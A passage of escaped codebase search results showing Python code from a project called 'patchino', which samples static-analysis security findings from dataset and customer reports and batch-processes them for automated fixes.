\\\\\\"xml\\\\\\",\\",\\"lineNumber\\":211},{\\"text\\":\\"    \\\\\\"yaml\\\\\\": None,\\",\\"lineNumber\\":212},{\\"text\\":\\"    \\\\\\"yaml core\\\\\\": None,\\",\\"lineNumber\\":213},{\\"text\\":\\"    \\\\\\"\\\\\\": None,\\",\\"lineNumber\\":214},{\\"text\\":\\"}\\",\\"lineNumber\\":215},{\\"lineNumber\\":216},{\\"lineNumber\\":217},{\\"text\\":\\"class SamplerConfig(BaseModel):\\",\\"lineNumber\\":218,\\"isSignature\\":true},{\\"text\\":\\"    sast_issue_types: Annotated[list[str], Len(min_length=1)]\\",\\"lineNumber\\":219},{\\"text\\":\\"    sast_issue_languages: Annotated[list[str], Len(min_length=1)]\\",\\"lineNumber\\":220},{\\"text\\":\\"    output_dir_path: str = str(SCRIPT_PATH / \\\\\\"../_samples\\\\\\")\\",\\"lineNumber\\":221},{\\"text\\":\\"    customer_report_path: Optional[str] = None\\",\\"lineNumber\\":222},{\\"text\\":\\"    customer_source_archive_path: Optional[str] = None\\",\\"lineNumber\\":223},{\\"text\\":\\"    customer_report_issue_indexes: Optional[list[int]] = None\\",\\"lineNumber\\":224},{\\"text\\":\\"    max_sample_count: int = 10\\",\\"lineNumber\\":225},{\\"text\\":\\"    is_from_docker: bool = False\\",\\"lineNumber\\":226},{\\"lineNumber\\":227},{\\"text\\":\\"    @classmethod\\",\\"lineNumber\\":228},{\\"text\\":\\"    def from_json(cls, json_str: str) -> SamplerConfig:\\",\\"lineNumber\\":229},{\\"text\\":\\"        data = json.loads(json_str)\\",\\"lineNumber\\":230},{\\"text\\":\\"        return cls.model_validate(data)\\",\\"lineNumber\\":231,\\"isSignature\\":true},{\\"lineNumber\\":232},{\\"lineNumber\\":233},{\\"text\\":\\"@dataclass\\",\\"lineNumber\\":234},{\\"text\\":\\"class Sample:\\",\\"lineNumber\\":235,\\"isSignature\\":true},{\\"text\\":\\"    issue: Issue\\",\\"lineNumber\\":236},{\\"text\\":\\"    report: BaseReportStream\\",\\"lineNumber\\":237}]},\\"score\\":0.35427165031433105},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":398,\\"column\\":18},\\"endPosition\\":{\\"line\\":497}},\\"contents\\":\\"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\\\n\\\\n\\\\n    ...\\\\n\\\\n\\\\n    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\\\n        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\\\n        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\\\n        issue_index = random.choice(issue_indexes)\\\\n\\\\n        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\\\\\"\\\\\\")\\\\n        source_code_zip_path = sast_report_summary_path.absolute().parent / \\\\\\"repo.zip\\\\\\"\\\\n\\\\n        issues, report = await _get_report_issues(\\\\n            sast_report_path,\\\\n            source_code_zip_path,\\\\n        )\\\\n        issue = issues[issue_index]\\\\n\\\\n        if issue.fingerprint_hash:\\\\n            samples.append(\\\\n                Sample(\\\\n                    issue=issues[issue_index],\\\\n                    report=report,\\\\n                    report_path=sast_report_path,\\\\n                    source_archive_path=source_code_zip_path,\\\\n                    is_public=True,\\\\n                )\\\\n            )\\\\n        else:\\\\n            print(\\\\n                f\\\\\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\\\\\"\\\\n            )\\\\n\\\\n        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\\\n\\\\n        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\\\n            del repo_to_issue_indexes[sast_report_summary_path]\\\\n\\\\n    return samples\\",\\"originalContents\\":\\"\\\\n\\\\n    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\\\n        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\\\n        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\\\n        issue_index = random.choice(issue_indexes)\\\\n\\\\n        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\\\\\"\\\\\\")\\\\n        source_code_zip_path = sast_report_summary_path.absolute().parent / \\\\\\"repo.zip\\\\\\"\\\\n\\\\n        issues, report = await _get_report_issues(\\\\n            sast_report_path,\\\\n            source_code_zip_path,\\\\n        )\\\\n        issue = issues[issue_index]\\\\n\\\\n        if issue.fingerprint_hash:\\\\n            samples.append(\\\\n                Sample(\\\\n                    issue=issues[issue_index],\\\\n                    report=report,\\\\n                    report_path=sast_report_path,\\\\n                    source_archive_path=source_code_zip_path,\\\\n                    is_public=True,\\\\n                )\\\\n            )\\\\n        else:\\\\n            print(\\\\n                f\\\\\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\\\\\"\\\\n            )\\\\n\\\\n        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\\\n\\\\n        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\\\n            del repo_to_issue_indexes[sast_report_summary_path]\\\\n\\\\n    return samples\\",\\"detailedLines\\":[{\\"text\\":\\"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":402,\\"isSignature\\":true},{\\"text\\":\\"    samples = []\\",\\"lineNumber\\":403},{\\"text\\":\\"(indexes)\\",\\"lineNumber\\":428},{\\"lineNumber\\":429},{\\"text\\":\\"    print(f\\\\\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\\\\\")\\",\\"lineNumber\\":430},{\\"lineNumber\\":431},{\\"text\\":\\"    while len(samples) <= config.max_sample_count and len(repo_to_issue_indexes) > 0:\\",\\"lineNumber\\":432},{\\"text\\":\\"        sast_report_summary_path = random.choice(list(repo_to_issue_indexes.keys()))\\",\\"lineNumber\\":433},{\\"text\\":\\"        issue_indexes = repo_to_issue_indexes[sast_report_summary_path]\\",\\"lineNumber\\":434},{\\"text\\":\\"        issue_index = random.choice(issue_indexes)\\",\\"lineNumber\\":435},{\\"lineNumber\\":436},{\\"text\\":\\"        sast_report_path = sast_report_summary_path.absolute().with_suffix(\\\\\\"\\\\\\")\\",\\"lineNumber\\":437},{\\"text\\":\\"        source_code_zip_path = sast_report_summary_path.absolute().parent / \\\\\\"repo.zip\\\\\\"\\",\\"lineNumber\\":438},{\\"lineNumber\\":439},{\\"text\\":\\"        issues, report = await _get_report_issues(\\",\\"lineNumber\\":440},{\\"text\\":\\"            sast_report_path,\\",\\"lineNumber\\":441},{\\"text\\":\\"            source_code_zip_path,\\",\\"lineNumber\\":442},{\\"text\\":\\"        )\\",\\"lineNumber\\":443},{\\"text\\":\\"        issue = issues[issue_index]\\",\\"lineNumber\\":444},{\\"lineNumber\\":445},{\\"text\\":\\"        if issue.fingerprint_hash:\\",\\"lineNumber\\":446},{\\"text\\":\\"            samples.append(\\",\\"lineNumber\\":447},{\\"text\\":\\"                Sample(\\",\\"lineNumber\\":448},{\\"text\\":\\"                    issue=issues[issue_index],\\",\\"lineNumber\\":449},{\\"text\\":\\"                    report=report,\\",\\"lineNumber\\":450},{\\"text\\":\\"                    report_path=sast_report_path,\\",\\"lineNumber\\":451},{\\"text\\":\\"                    source_archive_path=source_code_zip_path,\\",\\"lineNumber\\":452},{\\"text\\":\\"                    is_public=True,\\",\\"lineNumber\\":453},{\\"text\\":\\"                )\\",\\"lineNumber\\":454},{\\"text\\":\\"            )\\",\\"lineNumber\\":455},{\\"text\\":\\"        else:\\",\\"lineNumber\\":456},{\\"text\\":\\"            print(\\",\\"lineNumber\\":457},{\\"text\\":\\"                f\\\\\\"Skipping issue {issue.index} because cannot calculate fingerprint hash {str(sast_report_path)}\\\\\\"\\",\\"lineNumber\\":458},{\\"text\\":\\"            )\\",\\"lineNumber\\":459},{\\"lineNumber\\":460},{\\"text\\":\\"        repo_to_issue_indexes[sast_report_summary_path].remove(issue_index)\\",\\"lineNumber\\":461},{\\"lineNumber\\":462},{\\"text\\":\\"        if len(repo_to_issue_indexes[sast_report_summary_path]) == 0:\\",\\"lineNumber\\":463},{\\"text\\":\\"            del repo_to_issue_indexes[sast_report_summary_path]\\",\\"lineNumber\\":464},{\\"lineNumber\\":465},{\\"text\\":\\"    return samples\\",\\"lineNumber\\":466,\\"isSignature\\":true},{\\"lineNumber\\":467},{\\"lineNumber\\":468},{\\"text\\":\\"@locked_alru_cache\\",\\"lineNumber\\":469},{\\"text\\":\\"async def _get_report_issues(\\",\\"lineNumber\\":470,\\"isSignature\\":true},{\\"text\\":\\"    sast_report_path: pathlib.Path, source_code_zip_path: pathlib.Path\\",\\"lineNumber\\":471,\\"isSignature\\":true},{\\"text\\":\\") -> tuple[list[Issue], BaseReportStream]:\\",\\"lineNumber\\":472,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":473}]},\\"score\\":0.34733879566192627},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":342},\\"endPosition\\":{\\"line\\":465}},\\"contents\\":\\"\\\\n\\\\n\\\\nasync def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\\\n    samples = []\\\\n    repo_to_issue_indexes = defaultdict(list)\\\\n    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\\\\\"**/*.json\\\\\\"):\\\\n        with open(sast_report_summary_path, \\\\\\"r\\\\\\") as f:\\\\n            data = json.load(f)\\\\n\\\\n        # create a set of reports, and a dicionary from report to issue list indexes\\\\n        for language, dict_severity_to_type in data.items():\\\\n            if (\\\\n                language_mapping.get(language.lower(), \\\\\\"\\\\\\")\\\\n                not in config.sast_issue_languages\\\\n                and language not in config.sast_issue_languages\\\\n            ):\\\\n                continue\\\\n\\\\n            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\\\n                for issue_type, issue_data in issue_type_to_issue_data.items():\\\\n                    if issue_type not in config.sast_issue_types:\\\\n                        continue\\\\n\\\\n                    indexes = issue_data[\\\\\\"indexes\\\\\\"]\\\\n\\\\n                    if len(indexes) == 0:\\\\n                        continue\\\\n\\\\n                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\\\n\\\\n    print(f\\\\\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\\\\\")\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\nasync def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\\\n    samples = []\\\\n    repo_to_issue_indexes = defaultdict(list)\\\\n    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\\\\\"**/*.json\\\\\\"):\\\\n        with open(sast_report_summary_path, \\\\\\"r\\\\\\") as f:\\\\n            data = json.load(f)\\\\n\\\\n        # create a set of reports, and a dicionary from report to issue list indexes\\\\n        for language, dict_severity_to_type in data.items():\\\\n            if (\\\\n                language_mapping.get(language.lower(), \\\\\\"\\\\\\")\\\\n                not in config.sast_issue_languages\\\\n                and language not in config.sast_issue_languages\\\\n            ):\\\\n                continue\\\\n\\\\n            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\\\n                for issue_type, issue_data in issue_type_to_issue_data.items():\\\\n                    if issue_type not in config.sast_issue_types:\\\\n                        continue\\\\n\\\\n                    indexes = issue_data[\\\\\\"indexes\\\\\\"]\\\\n\\\\n                    if len(indexes) == 0:\\\\n                        continue\\\\n\\\\n                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\\\n\\\\n    print(f\\\\\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\\\\\")\\",\\"detailedLines\\":[{\\"text\\":\\"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":343,\\"isSignature\\":true},{\\"lineNumber\\":398},{\\"text\\":\\"    return samples\\",\\"lineNumber\\":399,\\"isSignature\\":true},{\\"lineNumber\\":400},{\\"lineNumber\\":401},{\\"text\\":\\"async def _get_dataset_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":402,\\"isSignature\\":true},{\\"text\\":\\"    samples = []\\",\\"lineNumber\\":403},{\\"text\\":\\"    repo_to_issue_indexes = defaultdict(list)\\",\\"lineNumber\\":404},{\\"text\\":\\"    for sast_report_summary_path in DATASET_DATA_FOLDER_PATH.rglob(\\\\\\"**/*.json\\\\\\"):\\",\\"lineNumber\\":405},{\\"text\\":\\"        with open(sast_report_summary_path, \\\\\\"r\\\\\\") as f:\\",\\"lineNumber\\":406},{\\"text\\":\\"            data = json.load(f)\\",\\"lineNumber\\":407},{\\"lineNumber\\":408},{\\"text\\":\\"        # create a set of reports, and a dicionary from report to issue list indexes\\",\\"lineNumber\\":409},{\\"text\\":\\"        for language, dict_severity_to_type in data.items():\\",\\"lineNumber\\":410},{\\"text\\":\\"            if (\\",\\"lineNumber\\":411},{\\"text\\":\\"                language_mapping.get(language.lower(), \\\\\\"\\\\\\")\\",\\"lineNumber\\":412},{\\"text\\":\\"                not in config.sast_issue_languages\\",\\"lineNumber\\":413},{\\"text\\":\\"                and language not in config.sast_issue_languages\\",\\"lineNumber\\":414},{\\"text\\":\\"            ):\\",\\"lineNumber\\":415},{\\"text\\":\\"                continue\\",\\"lineNumber\\":416},{\\"lineNumber\\":417},{\\"text\\":\\"            for severity, issue_type_to_issue_data in dict_severity_to_type.items():\\",\\"lineNumber\\":418},{\\"text\\":\\"                for issue_type, issue_data in issue_type_to_issue_data.items():\\",\\"lineNumber\\":419},{\\"text\\":\\"                    if issue_type not in config.sast_issue_types:\\",\\"lineNumber\\":420},{\\"text\\":\\"                        continue\\",\\"lineNumber\\":421},{\\"lineNumber\\":422},{\\"text\\":\\"                    indexes = issue_data[\\\\\\"indexes\\\\\\"]\\",\\"lineNumber\\":423},{\\"lineNumber\\":424},{\\"text\\":\\"                    if len(indexes) == 0:\\",\\"lineNumber\\":425},{\\"text\\":\\"                        continue\\",\\"lineNumber\\":426},{\\"lineNumber\\":427},{\\"text\\":\\"                    repo_to_issue_indexes[sast_report_summary_path].extend(indexes)\\",\\"lineNumber\\":428},{\\"lineNumber\\":429},{\\"text\\":\\"    print(f\\\\\\"Found {len(repo_to_issue_indexes)} dataset repositories with issues\\\\\\")\\",\\"lineNumber\\":430},{\\"lineNumber\\":431},{\\"text\\":\\"    while\\",\\"lineNumber\\":432}]},\\"score\\":0.3328891098499298},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/issue_processor.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":162},\\"endPosition\\":{\\"line\\":421}},\\"contents\\":\\"\\\\n\\\\n\\\\nasync def main():\\\\n    setup_json_logging(level=logging.INFO)\\\\n    # The config_path will be received as parameter\\\\n\\\\n    if len(sys.argv) > 1:\\\\n        config_path = sys.argv[1]\\\\n    else:\\\\n        # Default if no parameter is provided\\\\n        config_path = str(SCRIPT_PATH / \\\\\\"../_samples/samples.json\\\\\\")\\\\n\\\\n    config = ConfigManager(config_path)\\\\n    s3_connection = S3Access.init_connection(\\\\n        name=\\\\\\"patchino\\\\\\",\\\\n        endpoint=(\\\\n            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\\\n        ),\\\\n        access_key_id=AWS_S3_ACCESS_KEY_ID,\\\\n        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\\\n        bucket=AWS_S3_STORAGE_BUCKET,\\\\n        region=AWS_S3_STORAGE_REGION,\\\\n    )\\\\n\\\\n    logger.info(f\\\\\\"Config created at: {config.created_at}\\\\\\")\\\\n    logger.info(f\\\\\\"Total issues: {len(config.issues_info)}\\\\\\")\\\\n    logger.info(f\\\\\\"Public issues: {len(config.get_public_issues())}\\\\\\")\\\\n    logger.info(f\\\\\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\\\\\")\\\\n\\\\n    logger.info(\\\\\\"\\\\\\\\nAll Issues:\\\\\\")\\\\n    for idx, issue_info in enumerate(config.issues_info):\\\\n        logger.info(f\\\\\\"{idx + 1}. {issue_info}\\\\\\")\\\\n\\\\n    logger.info(\\\\\\"\\\\\\\\nLoading issue objects:\\\\\\")\\\\n    all_issue_objects = [\\\\n        issue_info\\\\n        for issue_info in config.get_non_skipped_issues()\\\\n        if issue_info.issue_object\\\\n    ]\\\\n    fix_issues_results = await process_objects_in_parallel(\\\\n        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\\\n    )\\\\n\\\\n    all_issues = []\\\\n    success_issues: dict[str, IssueInfo] = {}\\\\n    all_fixed_files: dict[str, dict[str, str]] = {}\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\nasync def main():\\\\n    setup_json_logging(level=logging.INFO)\\\\n    # The config_path will be received as parameter\\\\n\\\\n    if len(sys.argv) > 1:\\\\n        config_path = sys.argv[1]\\\\n    else:\\\\n        # Default if no parameter is provided\\\\n        config_path = str(SCRIPT_PATH / \\\\\\"../_samples/samples.json\\\\\\")\\\\n\\\\n    config = ConfigManager(config_path)\\\\n    s3_connection = S3Access.init_connection(\\\\n        name=\\\\\\"patchino\\\\\\",\\\\n        endpoint=(\\\\n            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\\\n        ),\\\\n        access_key_id=AWS_S3_ACCESS_KEY_ID,\\\\n        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\\\n        bucket=AWS_S3_STORAGE_BUCKET,\\\\n        region=AWS_S3_STORAGE_REGION,\\\\n    )\\\\n\\\\n    logger.info(f\\\\\\"Config created at: {config.created_at}\\\\\\")\\\\n    logger.info(f\\\\\\"Total issues: {len(config.issues_info)}\\\\\\")\\\\n    logger.info(f\\\\\\"Public issues: {len(config.get_public_issues())}\\\\\\")\\\\n    logger.info(f\\\\\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\\\\\")\\\\n\\\\n    logger.info(\\\\\\"\\\\\\\\nAll Issues:\\\\\\")\\\\n    for idx, issue_info in enumerate(config.issues_info):\\\\n        logger.info(f\\\\\\"{idx + 1}. {issue_info}\\\\\\")\\\\n\\\\n    logger.info(\\\\\\"\\\\\\\\nLoading issue objects:\\\\\\")\\\\n    all_issue_objects = [\\\\n        issue_info\\\\n        for issue_info in config.get_non_skipped_issues()\\\\n        if issue_info.issue_object\\\\n    ]\\\\n    fix_issues_results = await process_objects_in_parallel(\\\\n        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\\\n    )\\\\n\\\\n    all_issues = []\\\\n    success_issues: dict[str, IssueInfo] = {}\\\\n    all_fixed_files: dict[str, dict[str, str]] = {}\\",\\"detailedLines\\":[{\\"text\\":\\"class ConfigManager:\\",\\"lineNumber\\":163,\\"isSignature\\":true},{\\"text\\":\\"def get_issues_by_provider(self, provider: str) -> list[IssueInfo]:\\",\\"lineNumber\\":218},{\\"text\\":\\" provider.lower()\\",\\"lineNumber\\":223},{\\"text\\":\\"        ]\\",\\"lineNumber\\":224},{\\"lineNumber\\":225},{\\"text\\":\\"    def __repr__(self):\\",\\"lineNumber\\":226},{\\"text\\":\\"        return f\\\\\\"ConfigManager(created_at={self.created_at}, issues_count={len(self.issues_info)})\\\\\\"\\",\\"lineNumber\\":227,\\"isSignature\\":true},{\\"lineNumber\\":228},{\\"lineNumber\\":229},{\\"text\\":\\"async def main():\\",\\"lineNumber\\":230,\\"isSignature\\":true},{\\"text\\":\\"    setup_json_logging(level=logging.INFO)\\",\\"lineNumber\\":231},{\\"text\\":\\"    # The config_path will be received as parameter\\",\\"lineNumber\\":232},{\\"lineNumber\\":233},{\\"text\\":\\"    if len(sys.argv) > 1:\\",\\"lineNumber\\":234},{\\"text\\":\\"        config_path = sys.argv[1]\\",\\"lineNumber\\":235},{\\"text\\":\\"    else:\\",\\"lineNumber\\":236},{\\"text\\":\\"        # Default if no parameter is provided\\",\\"lineNumber\\":237},{\\"text\\":\\"        config_path = str(SCRIPT_PATH / \\\\\\"../_samples/samples.json\\\\\\")\\",\\"lineNumber\\":238},{\\"lineNumber\\":239},{\\"text\\":\\"    config = ConfigManager(config_path)\\",\\"lineNumber\\":240},{\\"text\\":\\"    s3_connection = S3Access.init_connection(\\",\\"lineNumber\\":241},{\\"text\\":\\"        name=\\\\\\"patchino\\\\\\",\\",\\"lineNumber\\":242},{\\"text\\":\\"        endpoint=(\\",\\"lineNumber\\":243},{\\"text\\":\\"            AWS_S3_ENDPOINT_FROM_DOCKER if config.is_from_docker else AWS_S3_ENDPOINT\\",\\"lineNumber\\":244},{\\"text\\":\\"        ),\\",\\"lineNumber\\":245},{\\"text\\":\\"        access_key_id=AWS_S3_ACCESS_KEY_ID,\\",\\"lineNumber\\":246},{\\"text\\":\\"        secret_access_key=AWS_S3_SECRET_ACCESS_KEY,\\",\\"lineNumber\\":247},{\\"text\\":\\"        bucket=AWS_S3_STORAGE_BUCKET,\\",\\"lineNumber\\":248},{\\"text\\":\\"        region=AWS_S3_STORAGE_REGION,\\",\\"lineNumber\\":249},{\\"text\\":\\"    )\\",\\"lineNumber\\":250},{\\"lineNumber\\":251},{\\"text\\":\\"    logger.info(f\\\\\\"Config created at: {config.created_at}\\\\\\")\\",\\"lineNumber\\":252},{\\"text\\":\\"    logger.info(f\\\\\\"Total issues: {len(config.issues_info)}\\\\\\")\\",\\"lineNumber\\":253},{\\"text\\":\\"    logger.info(f\\\\\\"Public issues: {len(config.get_public_issues())}\\\\\\")\\",\\"lineNumber\\":254},{\\"text\\":\\"    logger.info(f\\\\\\"Non-skipped issues: {len(config.get_non_skipped_issues())}\\\\\\")\\",\\"lineNumber\\":255},{\\"lineNumber\\":256},{\\"text\\":\\"    logger.info(\\\\\\"\\\\\\\\nAll Issues:\\\\\\")\\",\\"lineNumber\\":257},{\\"text\\":\\"    for idx, issue_info in enumerate(config.issues_info):\\",\\"lineNumber\\":258},{\\"text\\":\\"        logger.info(f\\\\\\"{idx + 1}. {issue_info}\\\\\\")\\",\\"lineNumber\\":259},{\\"lineNumber\\":260},{\\"text\\":\\"    logger.info(\\\\\\"\\\\\\\\nLoading issue objects:\\\\\\")\\",\\"lineNumber\\":261},{\\"text\\":\\"    all_issue_objects = [\\",\\"lineNumber\\":262},{\\"text\\":\\"        issue_info\\",\\"lineNumber\\":263},{\\"text\\":\\"        for issue_info in config.get_non_skipped_issues()\\",\\"lineNumber\\":264},{\\"text\\":\\"        if issue_info.issue_object\\",\\"lineNumber\\":265},{\\"text\\":\\"    ]\\",\\"lineNumber\\":266},{\\"text\\":\\"    fix_issues_results = await process_objects_in_parallel(\\",\\"lineNumber\\":267},{\\"text\\":\\"        all_issue_objects, fix_issue, batch_size=FIX_ISSUE_BATCH_SIZE\\",\\"lineNumber\\":268},{\\"text\\":\\"    )\\",\\"lineNumber\\":269},{\\"lineNumber\\":270},{\\"text\\":\\"    all_issues = []\\",\\"lineNumber\\":271},{\\"text\\":\\"    success_issues: dict[str, IssueInfo] = {}\\",\\"lineNumber\\":272},{\\"text\\":\\"    all_fixed_files: dict[str, dict[str, str]] = {}\\",\\"lineNumber\\":273},{\\"lineNumber\\":274},{\\"text\\":\\"    for issue_info, result in zip(all_issue_objects, fix_issues_results):\\",\\"lineNumber\\":275}]},\\"score\\":0.3203110694885254},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":270},\\"endPosition\\":{\\"line\\":398}},\\"contents\\":\\"\\\\n\\\\n\\\\nasync def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\\\n    if not config.customer_report_path or not config.customer_source_archive_path:\\\\n        return []\\\\n\\\\n    customer_issues, report = await _get_report_issues(\\\\n        pathlib.Path(config.customer_report_path),\\\\n        pathlib.Path(config.customer_source_archive_path),\\\\n    )\\\\n    samples = []\\\\n\\\\n    if (\\\\n        config.customer_report_issue_indexes\\\\n        and len(config.customer_report_issue_indexes) > 0\\\\n    ):\\\\n        for issue_index in config.customer_report_issue_indexes:\\\\n            issue = customer_issues[issue_index]\\\\n\\\\n            if not issue.fingerprint_hash:\\\\n                print(\\\\n                    f\\\\\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\\\\\"\\\\n                )\\\\n                continue\\\\n\\\\n            samples.append(\\\\n                Sample(\\\\n                    issue=issue,\\\\n                    report=report,\\\\n                    report_path=config.customer_report_path,\\\\n                    source_archive_path=config.customer_source_archive_path,\\\\n                    is_public=False,\\\\n                )\\\\n            )\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\nasync def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\\\n    if not config.customer_report_path or not config.customer_source_archive_path:\\\\n        return []\\\\n\\\\n    customer_issues, report = await _get_report_issues(\\\\n        pathlib.Path(config.customer_report_path),\\\\n        pathlib.Path(config.customer_source_archive_path),\\\\n    )\\\\n    samples = []\\\\n\\\\n    if (\\\\n        config.customer_report_issue_indexes\\\\n        and len(config.customer_report_issue_indexes) > 0\\\\n    ):\\\\n        for issue_index in config.customer_report_issue_indexes:\\\\n            issue = customer_issues[issue_index]\\\\n\\\\n            if not issue.fingerprint_hash:\\\\n                print(\\\\n                    f\\\\\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\\\\\"\\\\n                )\\\\n                continue\\\\n\\\\n            samples.append(\\\\n                Sample(\\\\n                    issue=issue,\\\\n                    report=report,\\\\n                    report_path=config.customer_report_path,\\\\n                    source_archive_path=config.customer_source_archive_path,\\\\n                    is_public=False,\\\\n                )\\\\n            )\\",\\"detailedLines\\":[{\\"text\\":\\"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\",\\"lineNumber\\":271,\\"isSignature\\":true},{\\"lineNumber\\":337},{\\"text\\":\\"            f,\\",\\"lineNumber\\":338},{\\"text\\":\\"            indent=4,\\",\\"lineNumber\\":339},{\\"text\\":\\"        )\\",\\"lineNumber\\":340,\\"isSignature\\":true},{\\"lineNumber\\":341},{\\"lineNumber\\":342},{\\"text\\":\\"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":343,\\"isSignature\\":true},{\\"text\\":\\"    if not config.customer_report_path or not config.customer_source_archive_path:\\",\\"lineNumber\\":344},{\\"text\\":\\"        return []\\",\\"lineNumber\\":345},{\\"lineNumber\\":346},{\\"text\\":\\"    customer_issues, report = await _get_report_issues(\\",\\"lineNumber\\":347},{\\"text\\":\\"        pathlib.Path(config.customer_report_path),\\",\\"lineNumber\\":348},{\\"text\\":\\"        pathlib.Path(config.customer_source_archive_path),\\",\\"lineNumber\\":349},{\\"text\\":\\"    )\\",\\"lineNumber\\":350},{\\"text\\":\\"    samples = []\\",\\"lineNumber\\":351},{\\"lineNumber\\":352},{\\"text\\":\\"    if (\\",\\"lineNumber\\":353},{\\"text\\":\\"        config.customer_report_issue_indexes\\",\\"lineNumber\\":354},{\\"text\\":\\"        and len(config.customer_report_issue_indexes) > 0\\",\\"lineNumber\\":355},{\\"text\\":\\"    ):\\",\\"lineNumber\\":356},{\\"text\\":\\"        for issue_index in config.customer_report_issue_indexes:\\",\\"lineNumber\\":357},{\\"text\\":\\"            issue = customer_issues[issue_index]\\",\\"lineNumber\\":358},{\\"lineNumber\\":359},{\\"text\\":\\"            if not issue.fingerprint_hash:\\",\\"lineNumber\\":360},{\\"text\\":\\"                print(\\",\\"lineNumber\\":361},{\\"text\\":\\"                    f\\\\\\"Skipping customer issue {issue.index} because cannot calculate fingerprint hash\\\\\\"\\",\\"lineNumber\\":362},{\\"text\\":\\"                )\\",\\"lineNumber\\":363},{\\"text\\":\\"                continue\\",\\"lineNumber\\":364},{\\"lineNumber\\":365},{\\"text\\":\\"            samples.append(\\",\\"lineNumber\\":366},{\\"text\\":\\"                Sample(\\",\\"lineNumber\\":367},{\\"text\\":\\"                    issue=issue,\\",\\"lineNumber\\":368},{\\"text\\":\\"                    report=report,\\",\\"lineNumber\\":369},{\\"text\\":\\"                    report_path=config.customer_report_path,\\",\\"lineNumber\\":370},{\\"text\\":\\"                    source_archive_path=config.customer_source_archive_path,\\",\\"lineNumber\\":371},{\\"text\\":\\"                    is_public=False,\\",\\"lineNumber\\":372},{\\"text\\":\\"                )\\",\\"lineNumber\\":373},{\\"text\\":\\"            )\\",\\"lineNumber\\":374},{\\"text\\":\\"    else:\\",\\"lineNumber\\":375},{\\"text\\":\\"        for issue in customer_issues:\\",\\"lineNumber\\":376}]},\\"score\\":0.3197915554046631},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":45,\\"column\\":33}},\\"contents\\":\\"from __future__ import annotations\\\\n\\\\nfrom typing import Annotated, Optional\\\\n\\\\nimport json\\\\nimport os\\\\nimport pathlib\\\\nimport pickle\\\\nimport random\\\\nimport tempfile\\\\nimport time\\\\nimport zipfile\\\\nfrom collections import defaultdict\\\\nfrom dataclasses import dataclass\\\\n\\\\nimport fire  # type: ignore[import-untyped]\\\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\\\nfrom annotated_types import Len\\\\nfrom dotenv import load_dotenv\\\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\\\nfrom pycommon.report.file_loader import FileLoader\\\\nfrom pycommon.report.issue import Issue\\\\nfrom pycommon.s3 import S3Access\\\\nfrom pydantic import BaseModel\\\\n\\\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\\\n    